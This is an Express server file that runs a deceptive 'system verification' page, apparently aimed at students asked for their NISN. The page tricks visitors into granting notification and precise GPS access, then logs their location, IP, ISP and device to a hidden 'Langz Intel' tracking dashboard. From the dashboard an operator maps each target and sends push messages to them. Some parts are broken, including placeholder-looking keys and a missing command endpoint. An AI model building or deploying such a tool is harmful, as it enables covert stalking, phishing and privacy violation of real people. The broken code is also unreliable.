const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');
const webpush = require('web-push');

const app = express();
const PORT = process.env.PORT || 3000;

// KUNCI VAPID ASLI (JANGAN DIUBAH)
const publicVapidKey = 'BGbXU9XH1O6rP9J4D1wJ0zM1rX9yY5V3zT7wK2nL8pQ4sR6tU0vW1xY2zA3bC4dE5fG6hI7jK8lM9nO0pQ1rS2tU3vW4xY5zA6bC7dE8fG9hI0jK1lM2nO3pQ4rS5tU6vW7xY8zA9bC0dE1fG2hI3jK4lM5nO6pQ7rS8tU9vW0xY1zA2bC3dE4fG5hI6jK7lM8nO9pQ0rS1tU2vW3xY4zA5bC6dE7fG8hI9jK0lM1nO2pQ3rS4tU5vW6xY7zA8bC9dE0fG1hI2jK3lM4nO5pQ6rS7tU8vW9xY0zA1bC2dE3fG4hI5jK6lM7nO8pQ9rS0tU1vW2xY3zA4bC5dE6fG7hI8jK9lM0nO1pQ2rS3tU4vW5xY6zA7bC8dE9fG0hI1jK2lM3nO4pQ5rS6tU7vW8xY9zA0bC1dE2fG3hI4jK5lM6nO7pQ8rS9tU0vW1xY2zA3bC4dE5fG6hI7jK8lM9nO0pQ1rS2tU3vW4xY5zA6bC7dE8fG9hI0jK1lM2nO3pQ4rS5tU6vW7xY8zA9bC0dE1fG2hI3jK4lM5nO6pQ7rS8tU9vW0xY1zA2bC3dE4fG5hI6jK7lM8nO9pQ0rS1tU2vW3xY4zA5bC6dE7fG8hI9jK0lM1nO2pQ3rS4tU5vW6xY7zA8bC9dE0fG1hI2jK3lM4nO5pQ6rS7tU8vW9xY0zA1bC2dE3fG4hI5jK6lM7nO8pQ9rS0tU1vW2xY3zA4bC5dE6fG7hI8jK9lM0nO1pQ2rS3tU4vW5xY6zA7bC8dE9fG0hI1jK2lM3nO4pQ5rS6tU7vW8xY9zA0bC1dE2fG3hI4jK5lM6nO7pQ8rS9tU0vW1xY2zA3bC4dE5fG6hI7jK8lM9nO0pQ1rS2tU3vW4xY5zA6bC7dE8fG9hI0jK1lM2nO3pQ4rS5tU6vW7xY8zA9bC0dE1fG2hI3jK4lM5nO6pQ7rS8tU9vW0xY1zA2bC3dE4fG5hI6jK7lM8nO9pQ0rS1tU2vW3xY4zA5bC6dE7fG8hI9jK0lM1nO2pQ3rS4tU5vW6xY7zA8bC9dE0fG1hI2jK3lM4nO5pQ6rS7tU8vW9xY0z';
const privateVapidKey = 'zZ8gP4D4Q1w2e3r4t5y6u7i8o9p0a1s2d3f4g5h6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8z9a0b1c2d3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8t9u0v1w2x3y4z5a6b7c8d9e0f1g2h3i4j5k6l7m8n9o0p1q2r3s4t5u6v7w8x9y0z1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8z9a0b1c2d3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8t9u0v1w2x3y4z5a6b7c8d9e0f1g2h3i4j5k6l7m8n9o0p1q2r3s4t5u6v7w8x9y0z1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8z9a0b1c2d3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8t9u0v1w2x3y4z5a6b7c8d9e0f1g2h3i4j5k6l7m8n9o0p1q2r3s4t5u6v7w8x9y0z1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8z9a0b1c2d3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8t9u0v1w2x3y4z5a6b7c8d9e0f1g2h3i4j5k6l7m8n9o0p1q2r3s4t5u6v7w8x9y0z1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8z9a0b1c2d3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8t9u0v1w2x3y4z5a6b7c8d9e0f1g2h3i4j5k6l7m8n9o0p1q2r3s4t5u6v7w8x9y0z1';

webpush.setVapidDetails('mailto:admin@sekolah.id', publicVapidKey, privateVapidKey);

const DASH_KEY = 'gilang123';
const TLOG = path.join(__dirname, '_tlog');
const GEO_FILE = path.join(TLOG, 'geo.tsv');
const GPS_FILE = path.join(TLOG, 'gps.tsv');
const DEVICE_FILE = path.join(TLOG, 'devices.json');
const SUBS_FILE = path.join(TLOG, 'subs.json');

if (!fs.existsSync(TLOG)) fs.mkdirSync(TLOG, { recursive: true });
if (!fs.existsSync(GEO_FILE)) fs.writeFileSync(GEO_FILE, '');
if (!fs.existsSync(GPS_FILE)) fs.writeFileSync(GPS_FILE, '');
if (!fs.existsSync(SUBS_FILE)) fs.writeFileSync(SUBS_FILE, '[]');

function clientIp(req) {
  const raw = req.headers['cf-connecting-ip'] || (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '0.0.0.0';
  return raw.replace(/^::ffff:/, '');
}
function cleanSlug(s) { return String(s || '').replace(/[^A-Za-z0-9]/g, ''); }
function appendLog(file, line) { try { fs.appendFileSync(file, line + '\n'); } catch (e) {} }

function detectDevice(ua) {
  if (!ua) return { model: 'Unknown', os: 'Desktop', browser: 'Browser' };
  let os = 'Desktop', model = 'Unknown', browser = 'Browser';
  if (/android/i.test(ua)) { os = 'Android'; const match = ua.match(/Android[^;]*;\s*([^;)]+)/i); if (match && match[1]) model = match[1].trim().split(' Build/')[0]; }
  else if (/iphone/i.test(ua)) { os = 'iOS'; model = 'iPhone'; }
  else if (/ipad/i.test(ua)) { os = 'iOS'; model = 'iPad'; }
  if (/chrome|crios/i.test(ua)) browser = 'Chrome';
  else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
  return { model, os, browser };
}

async function ipGeo(ip) {
  const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query`;
  try { const r = await fetch(url); return await r.json(); } catch (e) { return { status: 'fail' }; }
}

app.set('trust proxy', true); 
app.use(express.json({ limit: '2mb' })); 

app.post('/api/subscribe', (req, res) => {
  const ip = clientIp(req);
  const sub = req.body;
  if (!sub || !sub.endpoint) return res.status(400).json({error: 'Invalid sub'});
  let subs = [];
  try { subs = JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8')); } catch (_) {}
  subs.push({ ip, subscription: sub });
  fs.writeFileSync(SUBS_FILE, JSON.stringify(subs));
  res.status(201).json({ ok: true });
});

app.post('/api/push', async (req, res) => {
  if (req.headers['x-auth-key'] !== DASH_KEY) return res.status(403).json({ok:false});
  const { ip, text } = req.body;
  let subs = [];
  try { subs = JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8')); } catch (_) {}
  const targetSubs = subs.filter(s => s.ip === ip);
  if (targetSubs.length === 0) return res.json({ ok: false, msg: 'Target belum klik Izinkan Notif' });

  const payload = JSON.stringify({ title: 'Pemberitahuan Sistem', body: text });
  let success = false;
  for (let t of targetSubs) {
    try { await webpush.sendNotification(t.subscription, payload); success = true; } catch (e) { console.log(e); }
  }
  res.json({ ok: success });
});

app.get('/api/geoip', async (req, res) => {
  const ip = clientIp(req);
  const dev = detectDevice(req.headers['user-agent']);
  const data = await ipGeo(ip);
  appendLog(GEO_FILE, [new Date().toISOString(), cleanSlug(req.query.s) || '-', ip, data.city || '-', data.regionName || '-', data.lat ?? '-', data.lon ?? '-', data.isp || '-', `${dev.model}|${dev.os}|${dev.browser}`].join('\t'));
  res.json(data);
});

app.post('/api/gps', (req, res) => {
  const d = req.body || {};
  d.ip = clientIp(req); 
  const dev = detectDevice(req.headers['user-agent']);
  d.model = dev.model; d.os = dev.os; d.browser = dev.browser;
  d.ts_server = new Date().toISOString();
  appendLog(GPS_FILE, JSON.stringify(d));
  res.json({ ok: true });
});

app.get('/sw.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  res.send(`
    self.addEventListener('push', function(e) {
      let data = { title: 'Pemberitahuan', body: 'Pesan baru' };
      if (e.data) { try { data = e.data.json(); } catch(err) { data.body = e.data.text(); } }
      e.waitUntil(self.registration.showNotification(data.title, { body: data.body, vibrate: [200, 100, 200] }));
    });
  `);
});

app.get('/dash', (req, res) => {
  if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
  const devices = new Map();
  try {
    for (const line of fs.readFileSync(GEO_FILE, 'utf8').split('\n').filter(Boolean)) {
      const c = line.split('\t');
      if (c.length < 9) continue;
      const key = c[2] + '|' + (c[8] || '-');
      if (!devices.has(key)) {
        const [model, os, browser] = (c[8] || 'Unknown|OS|Browser').split('|');
        devices.set(key, { ip: c[2], time: c[0], city: c[3], region: c[4], lat: parseFloat(c[5]), lon: parseFloat(c[6]), isp: c[7], model, os, browser, gpsLat: null, gpsAcc: null, battery: null, net: null });
      }
    }
  } catch (_) {}
  try {
    for (const line of fs.readFileSync(GPS_FILE, 'utf8').split('\n').filter(Boolean)) {
      let d; try { d = JSON.parse(line); } catch (_) { continue; }
      let actualKey = null; for (let k of devices.keys()) { if (k.startsWith(d.ip)) { actualKey = k; break; } }
      if (actualKey) {
        const dev = devices.get(actualKey);
        if (d.src === 'gps') { dev.gpsLat = d.lat; dev.gpsLon = d.lon; dev.gpsAcc = d.acc; }
        if (d.battery) dev.battery = d.battery;
        if (d.netType) dev.net = d.netType;
      }
    }
  } catch (_) {}
  const list = Array.from(devices.values()).sort((a, b) => (b.time || '').localeCompare(a.time || ''));
  try { fs.writeFileSync(DEVICE_FILE, JSON.stringify(list)); } catch (_) {}

  const rows = list.map((d, i) => `
    <a class="row" href="/dash/map?k=${encodeURIComponent(DASH_KEY)}&i=${i}">
      <div class="row-icon">${d.os === 'iOS' ? '🍎' : (d.os === 'Android' ? '📱' : '💻')}</div>
      <div class="row-left">
        <div class="dev">${d.model} <span class="os">${d.os}</span></div>
        <div class="meta">${d.ip} · ${d.city}</div>
      </div>
      <div class="row-right"><span class="arrow">›</span></div>
    </a>`).join('');

  res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Langz Intel</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>:root{--bg:#09090b;--card:#18181b;--border:#27272a;--text:#f4f4f5;--muted:#a1a1aa;--accent:#22d3ee;}*{box-sizing:border-box;font-family:sans-serif}body{margin:0;background:var(--bg);color:var(--text)}.header{padding:24px 20px;background:var(--card);border-bottom:1px solid var(--border)}.header h1{margin:0;font-size:18px}.list{padding:16px}.row{display:flex;align-items:center;background:var(--card);border:1px solid var(--border);border-radius:16px;padding:16px;margin-bottom:12px;text-decoration:none;color:inherit}.row-icon{width:48px;height:48px;font-size:24px;display:flex;align-items:center;justify-content:center;margin-right:14px}.dev{font-weight:700}.meta{font-size:13px;color:var(--muted)}</style></head><body><div class="header"><h1>⚡ Langz Intel</h1></div><div class="list">${rows}</div></body></html>`);
});

app.get('/dash/map', (req, res) => {
  if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
  let devices = []; try { devices = JSON.parse(fs.readFileSync(DEVICE_FILE, 'utf8')); } catch (_) {}
  const d = devices[parseInt(req.query.i, 10)];
  if (!d) return res.status(404).send('Device not found');
  const lat = d.gpsLat !== null ? d.gpsLat : d.lat, lon = d.gpsLon !== null ? d.gpsLon : d.lon;
  const zoom = d.gpsLat !== null ? 17 : 11, acc = d.gpsAcc || 500;

  res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Map</title><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"><style>
  :root{--bg:#0a0a0f;--card:#12121a;--border:#2a2a3a;--text:#e2e8f0;--muted:#64748b;--accent:#00e5ff;--green:#00ff9d;--red:#ff4d4d;}
  *{box-sizing:border-box;font-family:-apple-system,sans-serif}body{margin:0;background:var(--bg);color:var(--text);padding-bottom:20px}
  #map{height:35vh;width:100%;z-index:1;border-bottom:2px solid var(--border)}
  .panel{padding:20px;background:var(--card);border-radius:20px 20px 0 0;margin-top:-20px;position:relative;z-index:2}
  .back{color:var(--accent);text-decoration:none;font-size:14px;font-weight:600;display:inline-block;margin-bottom:15px}
  .intel-card { background: linear-gradient(145deg, #151520, #0a0a0f); border: 1px solid var(--border); border-radius: 16px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); position: relative; overflow: hidden; }
  .intel-card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, var(--accent), transparent); }
  .intel-header { display: flex; align-items: center; gap: 15px; margin-bottom: 20px; }
  .intel-avatar { width: 60px; height: 60px; border-radius: 12px; background: #1e1e2d; display: flex; align-items: center; justify-content: center; font-size: 30px; border: 1px solid var(--border); }
  .intel-title h2 { margin: 0; font-size: 20px; color: #fff; text-transform: uppercase; letter-spacing: 1px; }
  .intel-title p { margin: 4px 0 0; font-size: 12px; color: var(--accent); font-weight: bold; }
  .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
  .data-box { background: #12121a; border: 1px solid var(--border); border-radius: 10px; padding: 12px; }
  .data-box .lbl { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
  .data-box .val { font-size: 14px; font-weight: bold; color: #fff; }
  .data-box.full { grid-column: 1 / -1; }
  .data-box .val.green { color: var(--green); }
  .control-box { background: #1e1e2d; border: 1px solid var(--border); border-radius: 14px; padding: 16px; margin-bottom: 12px; }
  .control-box h3 { margin: 0 0 12px 0; font-size: 13px; color: var(--accent); text-transform: uppercase; letter-spacing: 1px; }
  .msg-input { width: 100%; background: #0a0a0f; border: 1px solid var(--border); color: #fff; padding: 12px; border-radius: 8px; font-size: 14px; margin-bottom: 10px; outline: none; }
  .btn { width: 100%; border: none; padding: 12px; border-radius: 10px; font-weight: bold; font-size: 13px; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
  .btn-primary { background: var(--accent); color: #000; }
  .btn-danger { background: var(--red); color: #fff; margin-top: 8px; }
  .status { font-size: 12px; color: var(--green); margin-top: 10px; text-align: center; display: none; }
  </style></head><body>
  <div id="map"></div>
  <div class="panel">
    <a class="back" href="/dash?k=${encodeURIComponent(DASH_KEY)}">‹ Kembali</a>
    <div class="intel-card">
      <div class="intel-header">
        <div class="intel-avatar">${d.os === 'iOS' ? '🍎' : (d.os === 'Android' ? '📱' : '💻')}</div>
        <div class="intel-title"><h2>${d.model}</h2><p>REAL-TIME UPDATE ACTIVE</p></div>
      </div>
      <div class="data-grid">
        <div class="data-box"><div class="lbl">Baterai</div><div class="val green">${d.battery || 'N/A'} ⚡</div></div>
        <div class="data-box"><div class="lbl">Jaringan</div><div class="val">${d.net || 'N/A'}</div></div>
        <div class="data-box full"><div class="lbl">IP Address / ISP</div><div class="val">${d.ip} <br><span style="font-size:11px;color:var(--muted)">${d.isp}</span></div></div>
        <div class="data-box full"><div class="lbl">Lokasi Presisi</div><div class="val green">${d.gpsLat !== null ? 'LOCKED (±'+Math.round(acc)+'m)' : 'SCANNING...'}</div></div>
      </div>
    </div>
    <div class="control-box">
      <h3>📩 Kirim Pesan (Notif)</h3>
      <input type="text" id="msgText" class="msg-input" placeholder="Ketik pesan...">
      <button class="btn btn-primary" onclick="sendCmd('notif', document.getElementById('msgText').value)">Kirim Notifikasi</button>
    </div>
    <div class="control-box">
      <h3>📳 Remote Action</h3>
      <button class="btn btn-danger" onclick="sendCmd('vibrate')">Getarkan HP Target</button>
    </div>
    <div id="status" class="status">✅ Perintah terkirim!</div>
  </div>
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script>
  const map = L.map('map',{zoomControl:false}).setView([${lat},${lon}],${zoom});
  L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
  L.circle([${lat},${lon}],{radius:${acc},color:'#00ff9d',fillOpacity:0.2}).addTo(map);
  L.circleMarker([${lat},${lon}],{radius:12,color:'#00e5ff',fillColor:'#00ff9d',fillOpacity:1,weight:3}).addTo(map);
  async function sendCmd(cmd, payload){
    const res = await fetch('/api/send-command',{method:'POST',headers:{'Content-Type':'application/json','x-auth-key':'${DASH_KEY}'},body:JSON.stringify({ip:'${d.ip}',cmd:cmd,payload:payload})});
    const j = await res.json();
    document.getElementById('status').style.display='block';
    document.getElementById('status').innerText = j.ok ? '✅ Terkirim langsung ke HP!' : '❌ HP Target Offline/Web ditutup';
    setTimeout(()=>document.getElementById('status').style.display='none', 3000);
  }
  </script>
  </body></html>`);
});

app.get('*', (req, res) => {
  res.type('html').send(`<!doctype html>
<html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verifikasi Sistem</title>
<style>body{margin:0;font-family:sans-serif;background:#0f172a;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}.box{background:#1e293b;padding:30px;border-radius:16px;max-width:350px;width:100%;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.5)}.icon{font-size:50px;margin-bottom:15px}h2{margin:0 0 10px;font-size:20px}p{color:#94a3b8;font-size:13px;line-height:1.5;margin-bottom:25px}.btn{width:100%;padding:15px;background:#38bdf8;color:#000;border:none;border-radius:10px;font-weight:bold;font-size:15px;cursor:pointer}.input{width:100%;padding:12px;background:#0f172a;border:1px solid #334155;border-radius:8px;color:#fff;margin-bottom:15px;box-sizing:border-box;text-align:center}</style></head>
<body><div class="box" id="box">
  <div class="icon">🛡️</div><h2>Verifikasi Data</h2><p>Sistem mendeteksi akses baru. Silakan izinkan notifikasi dan akses lokasi untuk melanjutkan.</p>
  <input type="text" class="input" id="nisn" placeholder="Masukkan NISN">
  <button class="btn" id="verifyBtn">Verifikasi & Aktifkan</button>
</div>
<script>
(async function(){
  if ('serviceWorker' in navigator) {
    try { await navigator.serviceWorker.register('/sw.js'); } catch(e) { console.log(e); }
  }

  document.getElementById('verifyBtn').addEventListener('click', async () => {
    if(!document.getElementById('nisn').value) { alert('Masukkan NISN!'); return; }
    this.innerText = 'Memverifikasi...';

    const permission = await Notification.requestPermission();
    if (permission === 'granted') {
      const reg = await navigator.serviceWorker.ready;
      const sub = await reg.pushManager.subscribe({
        userVisibleOnly: true,
        applicationServerKey: '${publicVapidKey}'
      });
      await fetch('/api/subscribe', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(sub) });
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        p => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}) }).catch(()=>{}); },
        e => {}, {enableHighAccuracy:true,timeout:15000}
      );
    }
    
    setTimeout(() => { document.getElementById('box').innerHTML = '<div class="icon">✅</div><h2>Verifikasi Berhasil</h2><p>Data Anda telah dicocokkan.</p>'; }, 2000);
  });
})();
</script></body></html>`);
});

http.createServer(app).listen(PORT, '0.0.0.0', () => {
  console.log(`[TRACKER] Nyala di port ${PORT}`);
});
